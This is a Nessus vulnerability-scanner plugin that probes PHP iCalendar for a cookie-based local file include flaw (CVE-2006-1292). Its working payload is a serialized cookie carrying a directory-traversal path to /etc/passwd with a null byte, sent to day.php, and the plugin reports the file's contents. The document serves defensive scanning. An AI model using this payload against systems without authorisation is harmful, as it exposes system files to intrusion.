#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by a
local file include flaw. 

Description :

The remote host appears to be running PHP iCalendar, a web-based iCal
file viewer / parser written in PHP. 

The version of PHP iCalendar installed on the remote host fails to
sanitize input to cookie data normally used to store language and
template user preferences before using it in a PHP 'include()'
function in 'functions/init.inc.php'.  An unauthenticated attacker can
exploit this issue to view arbitrary files and possibly to execute
arbitrary PHP code on the affected host. 

Note that successful exploitation of this issue does not depend on the
setting of PHP's 'magic_quotes_gpc'.  It does, though, require that an
attacker be able to write to files on the remote host, perhaps by
injection into the web server's error log. 

See also :

http://www.nessus.org/u?e0010500

Solution :

Unknown at this time. 

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:P/A:N/B:N)";


if (description) {
  script_id(21083);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-1292");
  script_bugtraq_id(17125);

  script_name(english:"PHP iCalendar Cookie Data Local File Include Vulnerability");
  script_summary(english:"Tries to read a file using PHP iCalendar");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Exploit data.
file = "../../../../../../../../../../../../etc/passwd";
cookie = raw_string(
  "a:2:{",
    's:15:"cookie_language";s:', string(strlen(file)+1), ':"', file, 0x00, '";',
    's:12:"cookie_style";s:',    string(strlen(file)+1), ':"', file, 0x00, '";',
  "};"
);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/icalendar", "/phpicalendar", "/calendar", "/ical", "/cal", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  req = http_get(item:string(dir, "/day.php"), port:port);
  req = str_replace(
    string:req,
    find:"User-Agent:",
    replace:string(
      "Cookie: phpicalendar=", urlencode(str:cookie), "\r\n",
      "User-Agent:"
    )
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    contents = res - strstr(res, "<br ");

    report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Here are the contents of the file '/etc/passwd' that\n",
      "Nessus was able to read from the remote host :\n",
      "\n",
      contents
    );

    security_note(port:port, data:report);
    exit(0);
  }
}
